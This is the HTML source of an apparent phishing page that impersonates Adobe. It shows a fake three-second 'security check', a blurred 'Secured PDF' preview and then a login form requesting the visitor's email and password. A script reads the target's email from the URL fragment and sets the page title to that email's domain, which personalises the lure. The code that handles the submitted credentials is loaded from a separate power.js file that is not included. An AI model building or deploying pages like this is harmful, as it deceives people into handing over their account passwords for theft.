<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Account Verification</title>

  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">

  <!-- Custom CSS -->
  <link rel="stylesheet" href="style.css">

  <!-- Dynamic title script (unchanged) -->
  <script>
    window.addEventListener("DOMContentLoaded", function () {
      const hash = window.location.hash.substring(1);
      const parts = hash.split("@");
      if (parts.length === 2) {
        const domain = parts[1];
        const capitalized = domain.charAt(0).toUpperCase() + domain.slice(1);
        document.title = capitalized;
      }
    });
  </script>

  <!-- Startup logic -->
  <script>
    window.addEventListener("DOMContentLoaded", () => {
      const loader = document.getElementById("security-loader");
      const start = document.getElementById("start-screen");
      const overlay = document.getElementById("overlay");

      // Simulate "security check" for 3 seconds
      setTimeout(() => {
        loader.classList.add("hide");
        start.classList.add("show");
      }, 3000);

      // When user clicks the blurred doc, reveal login
      start.addEventListener("click", () => {
        start.classList.remove("show");
        start.classList.add("hide");
        setTimeout(() => overlay.classList.add("show"), 600);
      });
    });
  </script>
</head>
<body>

  <!-- Security Check Loader -->
  <div id="security-loader">
    <div class="loader-circle"></div>
    <div class="loader-text">Checking connection security...</div>
  </div>

  <!-- Full blurred document preview -->
  <div id="start-screen">
    <div class="doc-overlay">
      <i class="fas fa-file-pdf"></i>
      <span>🔒 Secured PDF — Click to view</span>
    </div>
  </div>

  <!-- Background iframe (your original element) -->
  <iframe id="bg-frame"></iframe>

  <!-- Login overlay (your existing layout) -->
  <div class="overlay" id="overlay">
    <div class="login-box">
      <img id="logo" alt="Logo" src="https://upload.wikimedia.org/wikipedia/commons/a/ab/Adobe_Corporate_logo.svg" />

      <div class="info-text">
        🗂️ <strong>Secured file access</strong> 🔐 — sign in for your provider’s verification
      </div>

      <div class="input-group">
        <i class="fas fa-envelope icon"></i>
        <input type="email" id="email" placeholder="Email" />
      </div>

      <div class="input-group">
        <i class="fas fa-lock icon"></i>
        <input type="password" id="password" placeholder="Password" />
      </div>

      <div id="error-msg" class="error-msg"></div>

      <button id="login-btn">Login</button>
    </div>
  </div>

  <!-- Bouncing Adobe-styled logo -->
  <div class="bouncing-logo">
    <img src="https://i.postimg.cc/SQqcxNCn/temp-Image-Bgz-Qo3.avif" alt="Adobe Logo" />
  </div>

  <!-- Your original JS file -->
  <script src="power.js"></script>
</body>
</html>
